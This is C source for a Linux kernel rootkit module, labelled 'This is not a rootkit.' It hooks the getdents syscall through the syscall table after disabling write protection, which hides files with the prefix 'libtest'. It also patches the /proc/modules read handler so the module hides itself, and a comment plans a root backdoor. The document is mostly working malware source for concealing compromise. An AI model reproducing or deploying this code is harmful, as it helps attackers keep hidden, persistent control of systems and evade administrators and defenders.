#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <asm/special_insns.h>
#include <asm/tlbflush.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("subut4i");
MODULE_DESCRIPTION("This is not a rootkit.");
MODULE_VERSION("0.1");

extern unsigned long loops_per_jiffy;
static unsigned long * syscall_table;
static int (*fixed_set_memory_rw)(unsigned long, int);
static int (*fixed_set_memory_ro)(unsigned long, int);

static struct file_operations* proc_modules_operations;

#define GETDENTS_SYSCALL_NUM 78
#define WR_PR (1u << 16)

#define HIDE_PREFIX     "libtest"
#define HIDE_PREFIX_SZ      (sizeof(HIDE_PREFIX) - 1)
#define MODULE_NAME     "rootkit"
#define MODULE_NAME_SZ  (sizeof(MODULE_NAME)-1)

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char        d_name[1];
 };

// function type for the getdents handler function
typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
// the original handler
sys_getdents_t sys_getdents_orig = NULL;


typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
// the original read handler
proc_modules_read_t proc_modules_read_orig = NULL;

// our new /proc/modules read handler
static ssize_t 
proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *offset) 
{
	char* bad_line = NULL;
	char* bad_line_end = NULL;
	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
	// search in the buf for MODULE_NAME, and remove that line
	bad_line = strnstr(buf, MODULE_NAME, ret);
	if (bad_line != NULL) {
		// find the end of the line
		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
			if (*bad_line_end == '\n') {
				bad_line_end++; // go past the line end, so we remove that too
				break;
			}
		}
		// copy over the bad line
		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
		// adjust the size of the return value
		ret -= (ssize_t)(bad_line_end - bad_line);
	}
	
	return ret;
}

/* 
 * Hook an existing proc/dev file to give us a backdoor (give current user root)
 * Hide us from /proc/modules
 * Hide libtest from file system (getdent)
 * Hide libtest from /proc/<PID>/maps
 *
 */


asmlinkage long 
sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
{
	int boff;
	struct linux_dirent __user * ent;
	long ret = sys_getdents_orig(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
				|| (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			// and adjust the length reported
			ret -= ent->d_reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}
	return ret;
}


static unsigned long * 
find_syscall_table (void)
{

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    unsigned long ret = kallsyms_lookup_name("syscall_table");
    printk("Found syscall table at %p\n", (void*)ret);
    return (unsigned long*)ret;
#else 
    unsigned long ptr;
    unsigned long *p;
    for (ptr = (unsigned long) sys_close;
            ptr < (unsigned long) &loops_per_jiffy;
            ptr += sizeof(void*)) {
        p = (unsigned long *)ptr;
        if (p[__NR_close] == (unsigned long) sys_close) {
            printk("found syscall table");
            return (unsigned long*)p;
        }
    }
    printk("syscall table not found");
    return NULL;
#endif
}

static int
init_syscall_table (void)
{
    syscall_table = (unsigned long*)find_syscall_table();
    fixed_set_memory_rw = (void*)kallsyms_lookup_name("set_memory_rw");

    if (!fixed_set_memory_rw) {
        printk(KERN_INFO "Unable to find set_memory_rw\n");
        return -1;
    }

    fixed_set_memory_ro = (void*)kallsyms_lookup_name("set_memory_ro");
    if (!fixed_set_memory_ro) {
        printk(KERN_INFO "Unable to find set_memory_ro\n");
        return -1;
    }

    printk(KERN_INFO "syscall init done\n");

    return 0;
}

static int
init_proc (void)
{
    proc_modules_operations = (struct file_operations*)kallsyms_lookup_name("proc_modules_operations");
    if (!proc_modules_operations) {
        printk(KERN_INFO "Unable to find module operations address\n");
        return -1;
    }
    return 0;
}

static __init int
rootkit_init (void)
{
    int ret;

    if (init_syscall_table()) {
        printk(KERN_ERR "Could not init syscall table\n");
        return -1;
    }

    printk(KERN_INFO "sys_call_table @ %p\n", syscall_table);

    if (init_proc()) {
        printk(KERN_ERR "Could not init proc\n");
        return -1;
    }

	
	// record the original getdents handler
	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
    proc_modules_read_orig = proc_modules_operations->read;
	
	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);

    write_cr0(read_cr0() & (~WR_PR));
    ret = fixed_set_memory_rw(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();

    if (ret) {
        printk(KERN_INFO "Unable to set memory rw\n");
    }

    
    syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
    proc_modules_operations->read = proc_modules_read_new;

    write_cr0(read_cr0() | WR_PR);
    ret = fixed_set_memory_ro(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();
	
    return 0;
}


static __exit void
rootkit_deinit (void)
{
    int ret;
    write_cr0(read_cr0() & (~WR_PR));
    ret = fixed_set_memory_rw(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();

    syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;

    write_cr0(read_cr0() | WR_PR);
    ret = fixed_set_memory_ro(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();
}

module_init(rootkit_init);
module_exit(rootkit_deinit);
